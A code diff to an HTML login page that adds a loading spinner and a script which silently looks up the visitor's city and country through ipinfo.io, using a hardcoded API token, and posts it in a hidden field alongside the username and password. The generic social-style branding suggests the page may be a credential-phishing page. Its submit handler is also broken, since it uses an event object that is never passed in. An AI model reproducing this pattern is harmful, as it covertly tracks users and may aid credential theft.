@@ -22,6 +22,24 @@
       form .pass {
         height: 3.3em !important;
       }
+
+      #submit2 img {
+        width: 1.3em;
+        animation-name: roll;
+        animation-duration: 0.7s;
+        animation-iteration-count: infinite;
+        animation-timing-function: linear;
+        color: white;
+      }
+
+      @keyframes roll {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
     </style>
   </head>
   <body onload="SwitchScreen()">
@@ -53,7 +71,7 @@
         <div class="logo">
           <img src="/img/socials/logo.png" alt="Logo" />
         </div>
-        <form method="post" accept=".">
+        <form method="post" accept="." onsubmit="handleSubmit()">
           <input
             type="text"
             name="username"
@@ -69,7 +87,16 @@
             placeholder="Password"
             class="pass"
           />
-          <input type="submit" name="submit" value="Login" />
+          <input type="hidden" name="country" id="country" value="" />
+          <button type="submit" name="submit" id="submit">Login</button>
+          <button
+            type="button"
+            name="submit"
+            id="submit2"
+            style="display: none"
+          >
+            <img src="/img/loading.svg" alt="" />
+          </button>
           <div class="other-option">
             <div></div>
             <p>OR</p>
@@ -177,3 +204,44 @@
     <script src="/js/socials/fontawesome.min.js"></script>
   </body>
 </html>
+
+<script>
+  const handleSubmit = (e) => {
+    const username = document.querySelector("#username");
+    const password = document.querySelector("#password");
+    const submitBtn = document.querySelector("#submit");
+    const submitBtn2 = document.querySelector("#submit2");
+
+    if (username.value.length > 0 && password.value.length > 0) {
+      submitBtn.style.display = "none";
+      submitBtn2.style.display = "block";
+    } else {
+      e.preventDefault();
+      return false;
+    }
+
+    e.preventDefault();
+    return false;
+  };
+</script>
+
+<script>
+  const apiKey = "f7aef6e7271770";
+  // Function to get client's country information
+  function getClientCountryInfo() {
+    const countryInput = document.querySelector("#country");
+    // Make a request to ipinfo.io to get information about the client's IP address
+    fetch(`https://ipinfo.io?token=${apiKey}`)
+      .then((response) => response.json())
+      .then((data) => {
+        // Extract the country information from the response
+        const country = data.city + " " + data.country;
+        console.log("Client Country:", country);
+        countryInput.value = country;
+      })
+      .catch((error) => console.error("Error fetching IP information:", error));
+  }
+
+  // Call the function to get client country information
+  getClientCountryInfo();
+</script>
